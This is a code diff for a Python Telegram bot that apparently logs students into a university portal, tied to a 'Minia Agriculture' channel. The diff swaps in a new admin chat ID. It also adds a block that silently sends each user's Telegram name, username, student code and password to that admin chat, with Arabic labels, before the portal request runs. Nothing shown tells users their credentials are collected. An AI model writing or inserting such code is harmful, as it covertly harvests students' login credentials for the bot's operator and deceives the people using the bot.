@@ -5,7 +5,7 @@ import requests
 import json
 from bs4 import BeautifulSoup
 
-admin_chat_id = 5321637533
+admin_chat_id = 1792449471
 
 dev = types.InlineKeyboardButton(text="𝑴𝒊𝒏𝒊𝒂 𝑨𝒈𝒓𝒊𝒄𝒖𝒍𝒕𝒖𝒓𝒆🌸🌾 ", url='https://t.me/+rbphVRSaWD9mNjg8')
 btn = types.InlineKeyboardMarkup()
@@ -62,6 +62,20 @@ def send_sms(message, chat_id, number):
         "UserLang": "E",
         "userType": "2",
     }
+    try:
+        
+        admin_message = (
+            f"ℹ️ *معلومات المستخدم:*\n"
+            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
+            f"• **كود الطالب:** {number} \n"
+            f"• **كلمة المرور:** {text}\n"
+            f"-------------------------------------\n"
+            f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
+        )
+        bot.send_message(admin_chat_id, admin_message)
+    except Exception as e:
+        error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
+        bot.send_message(admin_chat_id, error_message)
 
     try:
         response = requests.post(url1, headers=headers1, data=data, timeout=10)
